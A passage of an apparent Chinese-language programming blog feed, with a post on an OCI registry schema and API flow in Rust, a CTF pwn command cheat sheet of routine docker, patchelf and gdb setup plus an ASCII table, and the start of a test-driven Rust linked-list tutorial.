    os <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    variant <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    features <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    os_version <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    os_features <span class="token keyword">TEXT</span><span class="token punctuation">,</span>
    size <span class="token keyword">INTEGER</span><span class="token punctuation">,</span>
    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>list_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> manifest_lists<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>manifest_digest<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> manifests<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword">UNIQUE</span><span class="token punctuation">(</span>list_digest<span class="token punctuation">,</span> manifest_digest<span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> idx_blobs_digest <span class="token keyword">ON</span> blobs<span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> idx_manifests_repo_tag <span class="token keyword">ON</span> manifests<span class="token punctuation">(</span>repository<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> idx_manifest_lists_repo_tag <span class="token keyword">ON</span> manifest_lists<span class="token punctuation">(</span>repository<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>blobs表以SHA256算出来的digest为主键，在上传完成后才新增条目，uploads表用作中间状态，以uuid为主键，manifests表与镜像一一对应，其中的层信息存在manifest_layers表中。两个manifest_list相关的表，建出来摆着看的</p>
<p>对blob，主要有三种操作，上传，存在性检查和下载</p>
<p>对于上传，流程是先blob再manifest：</p>
<ul>
<li>上传过程分三步，第一步是一个POST请求，api：<code>/v2/&#123;name&#125;/blobs/uploads/</code>，给定一个仓库，可能选择挂载一个别的仓库下的镜像需要特殊处理。新建一个upload项，返回一个location URL，用uuid标识</li>
<li>第二步是一个PATCH请求，请求体里就是上传的镜像了，这一步是分片进行的，可能包含一个<code>bytes 0-65535</code>样的Content-Range。从数据库获取upload项，继续追加内容 </li>
<li>第三步是一个PUT请求，通知上传完成，可能有最后一部分blob内容，完成追加，清理临时文件，记录blob</li>
<li>另外还有一个获取上传状态的GET请求，获知已经传了多少数据以便重传，去查offset字段并返回即可</li>
</ul>
<p>存在性检查时根据digest检查是否有blob存在，取消上传是删除临时文件和upload记录，很直观<br>下载，读取blob并返回</p>
<p>然后是manifest相关的四个api，增删读查</p>
<p>增在所有层和blob上传之后，直接验证后写入对应字段即可</p>
<p>删只有未被tag或引用的可以，否则403。引用是指多仓库同镜像不重复存的机制，Rc减1即可不能删</p>
<p>读要获知configuration 和 layer digests，以便拉取blob</p>
<p>查存在性和digest/大小</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;OCI即Open Container</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="后端开发" scheme="https://aucept.in/tags/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>pwn“cache”</title>
    <link href="https://aucept.in/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://aucept.in/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-09-20T06:03:08.000Z</published>
    <updated>2025-11-12T02:14:37.096Z</updated>
    
    <content type="html"><![CDATA[<p>整理记录用到的命令，以避免每次用到查一遍</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><code>docker ps</code>查看运行的容器</p>
<p><code>docker exec -it ? /bin/bash</code>进入?id的容器终端</p>
<p><code>chmod +x &lt;file&gt;</code> 增加可执行权限</p>
<p><code>tty</code> <code>vim ~/.gdbinit</code></p>
<blockquote>
<p>set context-output /dev/pts/?</p>
</blockquote>
<p>设置gdb输出位置</p>
<p><code>source /pip_venv/bin/activate</code>进入python虚拟环境</p>
<p><code>tmux</code>进入tmux终端</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>很多时候需要和远程统一库函数，以及符合要求的ld</p>
<p><code>ldd pwn</code>查看pwn文件的链接情况</p>
<p><code>patchelf --replace-needed libc.so.6 ./libc.so.6 pwn</code>用当前文件夹下的libc.so.6替换pwn需要的链接库<br><code>patchelf --replace-needed ./libc.so.6 libc.so.6 pwn</code>改回系统链接库</p>
<p><code>strings ./libc.so.6 | grep GNU</code> 查找符合要求的ld版本信息，如果题目提供的话就不需要了</p>
<p><code>patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn</code> 设置解释器为当前路径下的，恢复默认：<code>patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2 pwn</code></p>
<p>或者用glibc-all-in-one的话<code>patchelf --set-interpreter /workspace/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so pwn</code></p>
<p><code>patchelf --set-rpath . pwn</code> 设置链接库路径，逆过程：<code>patchelf --remove-rpath pwn</code></p>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>开始调试程序：直接跟着待调试文件名，比如：<code>gdb pwn</code></p>
<p><code>start</code>寻找程序入口并中断</p>
<p><code>run</code>运行程序到断点或结束，可加参数</p>
<p><code>next</code>或简写<code>n</code>运行下一行代码，<code>nexti</code>或<code>ni</code>，运行下一行指令，汇编层面的一行，<code>step</code>或<code>s</code>，下一行代码，遇到函数时会步入，<code>stepi</code>或<code>si</code>运行下一行汇编级的指令，遇到函数会步入。程序的函数就si，遇到库函数就ni</p>
<p><code>info register</code>或<code>i r</code>查看当前寄存器信息</p>
<p><code>i address xx</code>查看函数地址</p>
<p><code>disass xxx</code>反汇编某处的指令</p>
<p><code>break xxx</code>在某处下断点，<code>info break</code>或<code>i b</code>查看当前所有断点信息。可以在指定函数处<code>b printf</code>或者地址<code>b *0x40127D</code></p>
<p><code>vmmap</code>查看内存分配情况</p>
<p><code>checksec</code>查看程序保护机制，NX等</p>
<p><code>quit</code>退出</p>
<p><code>x/s 0x?</code>以字符串查看指定位置内容</p>
<p><code>x/20gx $rsp</code>查看rsp以下20个8字节数据（16进制）</p>
<p><code>finish</code>执行到退出当前函数</p>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>context(arch=’amd64’, os=’linux’, log_level=’debug’)</p>
<p>context.terminal=[‘tmux’,’splitw’,’-h’]</p>
<h2 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h2><h3 id="控制字符-0-31"><a href="#控制字符-0-31" class="headerlink" title="控制字符 (0-31)"></a>控制字符 (0-31)</h3><div class="table-container">
<table>
<thead>
<tr>
<th>十进制</th>
<th>十六进制</th>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>00</td>
<td>NUL</td>
<td>空字符</td>
</tr>
<tr>
<td>1</td>
<td>01</td>
<td>SOH</td>
<td>标题开始</td>
</tr>
<tr>
<td>2</td>
<td>02</td>
<td>STX</td>
<td>正文开始</td>
</tr>
<tr>
<td>3</td>
<td>03</td>
<td>ETX</td>
<td>正文结束</td>
</tr>
<tr>
<td>4</td>
<td>04</td>
<td>EOT</td>
<td>传输结束</td>
</tr>
<tr>
<td>5</td>
<td>05</td>
<td>ENQ</td>
<td>询问</td>
</tr>
<tr>
<td>6</td>
<td>06</td>
<td>ACK</td>
<td>收到通知</td>
</tr>
<tr>
<td>7</td>
<td>07</td>
<td>BEL</td>
<td>铃</td>
</tr>
<tr>
<td>8</td>
<td>08</td>
<td>BS</td>
<td>退格</td>
</tr>
<tr>
<td>9</td>
<td>09</td>
<td>HT</td>
<td>水平制表符</td>
</tr>
<tr>
<td>10</td>
<td>0A</td>
<td>LF</td>
<td>换行键</td>
</tr>
<tr>
<td>11</td>
<td>0B</td>
<td>VT</td>
<td>垂直制表符</td>
</tr>
<tr>
<td>12</td>
<td>0C</td>
<td>FF</td>
<td>换页键</td>
</tr>
<tr>
<td>13</td>
<td>0D</td>
<td>CR</td>
<td>回车键</td>
</tr>
<tr>
<td>14</td>
<td>0E</td>
<td>SO</td>
<td>移出</td>
</tr>
<tr>
<td>15</td>
<td>0F</td>
<td>SI</td>
<td>移入</td>
</tr>
<tr>
<td>16</td>
<td>10</td>
<td>DLE</td>
<td>数据链路转义</td>
</tr>
<tr>
<td>17</td>
<td>11</td>
<td>DC1</td>
<td>设备控制 1</td>
</tr>
<tr>
<td>18</td>
<td>12</td>
<td>DC2</td>
<td>设备控制 2</td>
</tr>
<tr>
<td>19</td>
<td>13</td>
<td>DC3</td>
<td>设备控制 3</td>
</tr>
<tr>
<td>20</td>
<td>14</td>
<td>DC4</td>
<td>设备控制 4</td>
</tr>
<tr>
<td>21</td>
<td>15</td>
<td>NAK</td>
<td>拒绝接收</td>
</tr>
<tr>
<td>22</td>
<td>16</td>
<td>SYN</td>
<td>同步空闲</td>
</tr>
<tr>
<td>23</td>
<td>17</td>
<td>ETB</td>
<td>传输块结束</td>
</tr>
<tr>
<td>24</td>
<td>18</td>
<td>CAN</td>
<td>取消</td>
</tr>
<tr>
<td>25</td>
<td>19</td>
<td>EM</td>
<td>介质中断</td>
</tr>
<tr>
<td>26</td>
<td>1A</td>
<td>SUB</td>
<td>替换</td>
</tr>
<tr>
<td>27</td>
<td>1B</td>
<td>ESC</td>
<td>换码符</td>
</tr>
<tr>
<td>28</td>
<td>1C</td>
<td>FS</td>
<td>文件分隔符</td>
</tr>
<tr>
<td>29</td>
<td>1D</td>
<td>GS</td>
<td>组分隔符</td>
</tr>
<tr>
<td>30</td>
<td>1E</td>
<td>RS</td>
<td>记录分离符</td>
</tr>
<tr>
<td>31</td>
<td>1F</td>
<td>US</td>
<td>单元分隔符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可打印字符-32-127"><a href="#可打印字符-32-127" class="headerlink" title="可打印字符 (32-127)"></a>可打印字符 (32-127)</h3><div class="table-container">
<table>
<thead>
<tr>
<th>十进制</th>
<th>十六进制</th>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>32</td>
<td>20</td>
<td>(空格)</td>
<td>空格</td>
</tr>
<tr>
<td>33</td>
<td>21</td>
<td>!</td>
<td>感叹号</td>
</tr>
<tr>
<td>34</td>
<td>22</td>
<td>“</td>
<td>双引号</td>
</tr>
<tr>
<td>35</td>
<td>23</td>
<td>#</td>
<td>井号</td>
</tr>
<tr>
<td>36</td>
<td>24</td>
<td>$</td>
<td>美元符</td>
</tr>
<tr>
<td>37</td>
<td>25</td>
<td>%</td>
<td>百分号</td>
</tr>
<tr>
<td>38</td>
<td>26</td>
<td>&amp;</td>
<td>与</td>
</tr>
<tr>
<td>39</td>
<td>27</td>
<td>‘</td>
<td>单引号</td>
</tr>
<tr>
<td>40</td>
<td>28</td>
<td>(</td>
<td>左括号</td>
</tr>
<tr>
<td>41</td>
<td>29</td>
<td>)</td>
<td>右括号</td>
</tr>
<tr>
<td>42</td>
<td>2A</td>
<td>*</td>
<td>星号</td>
</tr>
<tr>
<td>43</td>
<td>2B</td>
<td>+</td>
<td>加号</td>
</tr>
<tr>
<td>44</td>
<td>2C</td>
<td>,</td>
<td>逗号</td>
</tr>
<tr>
<td>45</td>
<td>2D</td>
<td>-</td>
<td>连字号或减号</td>
</tr>
<tr>
<td>46</td>
<td>2E</td>
<td>.</td>
<td>句点或小数点</td>
</tr>
<tr>
<td>47</td>
<td>2F</td>
<td>/</td>
<td>斜杠</td>
</tr>
<tr>
<td>48</td>
<td>30</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>49</td>
<td>31</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>50</td>
<td>32</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td>51</td>
<td>33</td>
<td>3</td>
<td>3</td>
</tr>
<tr>
<td>52</td>
<td>34</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td>53</td>
<td>35</td>
<td>5</td>
<td>5</td>
</tr>
<tr>
<td>54</td>
<td>36</td>
<td>6</td>
<td>6</td>
</tr>
<tr>
<td>55</td>
<td>37</td>
<td>7</td>
<td>7</td>
</tr>
<tr>
<td>56</td>
<td>38</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>57</td>
<td>39</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>58</td>
<td>3A</td>
<td>:</td>
<td>冒号</td>
</tr>
<tr>
<td>59</td>
<td>3B</td>
<td>;</td>
<td>分号</td>
</tr>
<tr>
<td>60</td>
<td>3C</td>
<td>&lt;</td>
<td>小于</td>
</tr>
<tr>
<td>61</td>
<td>3D</td>
<td>=</td>
<td>等号</td>
</tr>
<tr>
<td>62</td>
<td>3E</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>63</td>
<td>3F</td>
<td>?</td>
<td>问号</td>
</tr>
<tr>
<td>64</td>
<td>40</td>
<td>@</td>
<td>电子邮件符号</td>
</tr>
<tr>
<td>65</td>
<td>41</td>
<td>A</td>
<td>大写字母 A</td>
</tr>
<tr>
<td>66</td>
<td>42</td>
<td>B</td>
<td>大写字母 B</td>
</tr>
<tr>
<td>67</td>
<td>43</td>
<td>C</td>
<td>大写字母 C</td>
</tr>
<tr>
<td>68</td>
<td>44</td>
<td>D</td>
<td>大写字母 D</td>
</tr>
<tr>
<td>69</td>
<td>45</td>
<td>E</td>
<td>大写字母 E</td>
</tr>
<tr>
<td>70</td>
<td>46</td>
<td>F</td>
<td>大写字母 F</td>
</tr>
<tr>
<td>71</td>
<td>47</td>
<td>G</td>
<td>大写字母 G</td>
</tr>
<tr>
<td>72</td>
<td>48</td>
<td>H</td>
<td>大写字母 H</td>
</tr>
<tr>
<td>73</td>
<td>49</td>
<td>I</td>
<td>大写字母 I</td>
</tr>
<tr>
<td>74</td>
<td>4A</td>
<td>J</td>
<td>大写字母 J</td>
</tr>
<tr>
<td>75</td>
<td>4B</td>
<td>K</td>
<td>大写字母 K</td>
</tr>
<tr>
<td>76</td>
<td>4C</td>
<td>L</td>
<td>大写字母 L</td>
</tr>
<tr>
<td>77</td>
<td>4D</td>
<td>M</td>
<td>大写字母 M</td>
</tr>
<tr>
<td>78</td>
<td>4E</td>
<td>N</td>
<td>大写字母 N</td>
</tr>
<tr>
<td>79</td>
<td>4F</td>
<td>O</td>
<td>大写字母 O</td>
</tr>
<tr>
<td>80</td>
<td>50</td>
<td>P</td>
<td>大写字母 P</td>
</tr>
<tr>
<td>81</td>
<td>51</td>
<td>Q</td>
<td>大写字母 Q</td>
</tr>
<tr>
<td>82</td>
<td>52</td>
<td>R</td>
<td>大写字母 R</td>
</tr>
<tr>
<td>83</td>
<td>53</td>
<td>S</td>
<td>大写字母 S</td>
</tr>
<tr>
<td>84</td>
<td>54</td>
<td>T</td>
<td>大写字母 T</td>
</tr>
<tr>
<td>85</td>
<td>55</td>
<td>U</td>
<td>大写字母 U</td>
</tr>
<tr>
<td>86</td>
<td>56</td>
<td>V</td>
<td>大写字母 V</td>
</tr>
<tr>
<td>87</td>
<td>57</td>
<td>W</td>
<td>大写字母 W</td>
</tr>
<tr>
<td>88</td>
<td>58</td>
<td>X</td>
<td>大写字母 X</td>
</tr>
<tr>
<td>89</td>
<td>59</td>
<td>Y</td>
<td>大写字母 Y</td>
</tr>
<tr>
<td>90</td>
<td>5A</td>
<td>Z</td>
<td>大写字母 Z</td>
</tr>
<tr>
<td>91</td>
<td>5B</td>
<td>[</td>
<td>左中括号</td>
</tr>
<tr>
<td>92</td>
<td>5C</td>
<td>\</td>
<td>反斜杠</td>
</tr>
<tr>
<td>93</td>
<td>5D</td>
<td>]</td>
<td>右中括号</td>
</tr>
<tr>
<td>94</td>
<td>5E</td>
<td>^</td>
<td>音调符号</td>
</tr>
<tr>
<td>95</td>
<td>5F</td>
<td>_</td>
<td>下划线</td>
</tr>
<tr>
<td>96</td>
<td>60</td>
<td>`</td>
<td>重音符</td>
</tr>
<tr>
<td>97</td>
<td>61</td>
<td>a</td>
<td>小写字母 a</td>
</tr>
<tr>
<td>98</td>
<td>62</td>
<td>b</td>
<td>小写字母 b</td>
</tr>
<tr>
<td>99</td>
<td>63</td>
<td>c</td>
<td>小写字母 c</td>
</tr>
<tr>
<td>100</td>
<td>64</td>
<td>d</td>
<td>小写字母 d</td>
</tr>
<tr>
<td>101</td>
<td>65</td>
<td>e</td>
<td>小写字母 e</td>
</tr>
<tr>
<td>102</td>
<td>66</td>
<td>f</td>
<td>小写字母 f</td>
</tr>
<tr>
<td>103</td>
<td>67</td>
<td>g</td>
<td>小写字母 g</td>
</tr>
<tr>
<td>104</td>
<td>68</td>
<td>h</td>
<td>小写字母 h</td>
</tr>
<tr>
<td>105</td>
<td>69</td>
<td>i</td>
<td>小写字母 i</td>
</tr>
<tr>
<td>106</td>
<td>6A</td>
<td>j</td>
<td>小写字母 j</td>
</tr>
<tr>
<td>107</td>
<td>6B</td>
<td>k</td>
<td>小写字母 k</td>
</tr>
<tr>
<td>108</td>
<td>6C</td>
<td>l</td>
<td>小写字母 l</td>
</tr>
<tr>
<td>109</td>
<td>6D</td>
<td>m</td>
<td>小写字母 m</td>
</tr>
<tr>
<td>110</td>
<td>6E</td>
<td>n</td>
<td>小写字母 n</td>
</tr>
<tr>
<td>111</td>
<td>6F</td>
<td>o</td>
<td>小写字母 o</td>
</tr>
<tr>
<td>112</td>
<td>70</td>
<td>p</td>
<td>小写字母 p</td>
</tr>
<tr>
<td>113</td>
<td>71</td>
<td>q</td>
<td>小写字母 q</td>
</tr>
<tr>
<td>114</td>
<td>72</td>
<td>r</td>
<td>小写字母 r</td>
</tr>
<tr>
<td>115</td>
<td>73</td>
<td>s</td>
<td>小写字母 s</td>
</tr>
<tr>
<td>116</td>
<td>74</td>
<td>t</td>
<td>小写字母 t</td>
</tr>
<tr>
<td>117</td>
<td>75</td>
<td>u</td>
<td>小写字母 u</td>
</tr>
<tr>
<td>118</td>
<td>76</td>
<td>v</td>
<td>小写字母 v</td>
</tr>
<tr>
<td>119</td>
<td>77</td>
<td>w</td>
<td>小写字母 w</td>
</tr>
<tr>
<td>120</td>
<td>78</td>
<td>x</td>
<td>小写字母 x</td>
</tr>
<tr>
<td>121</td>
<td>79</td>
<td>y</td>
<td>小写字母 y</td>
</tr>
<tr>
<td>122</td>
<td>7A</td>
<td>z</td>
<td>小写字母 z</td>
</tr>
<tr>
<td>123</td>
<td>7B</td>
<td>{</td>
<td>左大括号</td>
</tr>
<tr>
<td>124</td>
<td>7C</td>
<td>I</td>
<td>垂直线</td>
</tr>
<tr>
<td>125</td>
<td>7D</td>
<td>}</td>
<td>右大括号</td>
</tr>
<tr>
<td>126</td>
<td>7E</td>
<td>~</td>
<td>波浪号</td>
</tr>
<tr>
<td>127</td>
<td>7F</td>
<td>DEL</td>
<td>删除</td>
</tr>
</tbody>
</table>
</div>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;整理记录用到的命令，以避免每次用到查一遍&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;&lt;code&gt;docker</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>手搓一个简单的链表</title>
    <link href="https://aucept.in/2025/08/31/%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
    <id>https://aucept.in/2025/08/31/%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E9%93%BE%E8%A1%A8/</id>
    <published>2025-08-31T05:40:11.000Z</published>
    <updated>2025-09-03T14:06:01.832Z</updated>
    
    <content type="html"><![CDATA[<p>已经学习rust一周了，是时候尝试一下链表了</p>
<p>按照TDD的规范，先写第一个测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">//lib.rs</span>
<span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token operator">*</span><span class="token punctuation">;</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_list_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> list <span class="token punctuation">:</span> <span class="token class-name">List</span> <span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">isempty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>第一个细节是 <code>use super::*</code>，rust项目在一个crate里的组织是以mod为单元的，也就是说虽然tests模块写在了lib.rs，它和直接写在lib.rs里的函数仍然是分离的。<code>use super::*</code>表示把父模块的全部方法引入进当前模块</p>
<p>接下来定义List结构体，完成new和isempty方法<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">//lib.rs</span>
<span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">List</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    head <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token class-name">List</span><span class="token punctuation">&#123;</span>head <span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">isempty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>Option&lt;Box&lt;Node&lt;T&gt;&gt;&gt;</code>，好冗长的东西。head应该是一个指向链表首地址的指针，而链表的本体要放在堆上。Box用来封装到堆上，类型是，元素为T类型的节点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span> <span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token operator">>></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>所以补充这一行简化代码</p>
<p>另一个细节是<code>impl&lt;T&gt; List&lt;T&gt;</code>这里有两个&lt; T>，第一个是声明这里要用到一个泛型模板T，第二个则是跟着每个List出现的类型说明</p>
<p>该写下一个测试了，关于pop和push方法，仅在头部进出元素：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/*other tests*/</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_list_push_and_pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token punctuation">:</span> <span class="token class-name">List</span> <span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">336699</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">336699</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>如下：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/*existing code*/</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span>val <span class="token punctuation">:</span> <span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>val <span class="token punctuation">:</span> val<span class="token punctuation">,</span>next <span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
